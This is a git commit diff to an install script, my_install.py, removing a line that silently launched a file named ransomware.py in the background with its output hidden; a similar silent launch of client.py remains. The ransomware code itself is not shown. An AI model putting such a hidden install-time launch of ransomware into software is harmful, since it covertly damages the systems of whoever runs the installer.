b7d8eb801939941d9f2d9d46537e07bbbb9dd5b0
ronch11 <71279601+ronch11@users.noreply.github.com>
2024-01-24 21:11:49 +0200

    Update my_install.py

--- client-code/my_install.py
+++ client-code/my_install.py
@@ -9,4 +9,3 @@ time.sleep(2)
 
 # Run the second script in the background and redirect the output to /dev/null
 subprocess.Popen(["python", "client.py"], stdout=open("/dev/null", "w"), stderr=subprocess.PIPE)
-subprocess.Popen(["python", "ransomware.py"], stdout=open("/dev/null", "w"), stderr=subprocess.PIPE)
